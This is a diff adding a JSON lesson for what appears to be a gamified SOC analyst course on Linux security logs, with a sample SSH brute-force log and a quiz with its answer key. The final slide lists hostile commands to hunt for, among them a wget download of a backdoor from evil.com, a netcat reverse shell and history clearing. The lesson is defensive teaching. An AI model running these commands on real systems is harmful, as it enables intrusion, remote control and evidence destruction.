@@ -1,0 +1,62 @@
+{
+    "id": "l5",
+    "chapterId": "ch_4",
+    "title": "Linux Security Events",
+    "description": "Auth logs, syslog, and command history analysis.",
+    "xpReward": 25,
+    "estimatedMinutes": 7,
+    "section": "Linux",
+    "slides": [
+        {
+            "id": "s_l5_1",
+            "type": "text",
+            "title": "Linux Logging: The Syslog Standard 🐧",
+            "content": "# Where Linux Hides Its Secrets\n\nMost Linux servers log to text files in `/var/log/`.\n\n**Key Files for SOC Analysts:**\n\n1.  **`/var/log/auth.log` (Debian/Ubuntu) or `/var/log/secure` (RHEL/CentOS):**\n    *   **The Linux version of Windows Security Log.**\n    *   Tracks: `sshd` (SSH logins), `sudo` commands, `su` (switch user), failed password attempts.\n2.  **`/var/log/syslog`:**\n    *   General system messages (kernel, services).\n3.  **`/var/log/apache2/access.log`:**\n    *   Web server requests.\n4.  **User Shell History:**\n    *   `~/.bash_history` - Every command the user typed in the terminal."
+        },
+        {
+            "id": "s_l5_2",
+            "type": "code",
+            "title": "Reading auth.log (SSH Brute Force)",
+            "content": "This is what a brute-force attack looks like in a Linux log.",
+            "codeSnippet": "Mar 14 02:15:33 server01 sshd[12345]: Failed password for invalid user admin from 185.142.53.21 port 54321 ssh2\nMar 14 02:15:34 server01 sshd[12346]: Failed password for invalid user test from 185.142.53.21 port 54322 ssh2\nMar 14 02:15:35 server01 sshd[12347]: Failed password for root from 185.142.53.21 port 54323 ssh2\nMar 14 02:15:36 server01 sshd[12348]: Accepted password for ubuntu from 192.168.1.100 port 45678 ssh2",
+            "codeLanguage": "text",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l5_3",
+            "type": "quiz",
+            "title": "Linux Log Check 🐧",
+            "content": "",
+            "quizData": {
+                "id": "q_l5_1",
+                "type": "multiple_choice",
+                "question": "You see a line in `auth.log`: `pam_unix(sudo:session): session opened for user root by jsmith(uid=0)`. What happened?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "User 'jsmith' logged out.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "User 'jsmith' successfully used 'sudo' to run a command as root.",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "A new user account was created.",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "`pam_unix` handles authentication. This log shows privilege escalation via `sudo`.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l5_4",
+            "type": "text",
+            "title": "The Power of .bash_history 📜",
+            "content": "# Following the Attacker's Footsteps\n\nWhen an attacker gains access to a Linux server, they almost always use the command line.\n\n**Defensive Gold:** The `.bash_history` file (and its timestamped version if auditing is on) tells you **exactly** what they typed.\n\n**Suspicious Commands to Hunt For:**\n*   `wget http://evil.com/backdoor.sh -O /tmp/update.sh` (Downloading malware)\n*   `chmod +x /tmp/update.sh` (Making it executable)\n*   `crontab -e` (Setting up a scheduled task/persistence)\n*   `nc -e /bin/sh 192.168.1.100 4444` (Netcat reverse shell)\n*   `history -c` (Clearing the history log - **This itself is a MASSIVE red flag!**)\n\n**Note:** Attackers know we look here. They often clear the history or disable logging. That's why **centralized logging (SIEM)** is crucial—so they can't delete the evidence."
+        }
+    ]
+}
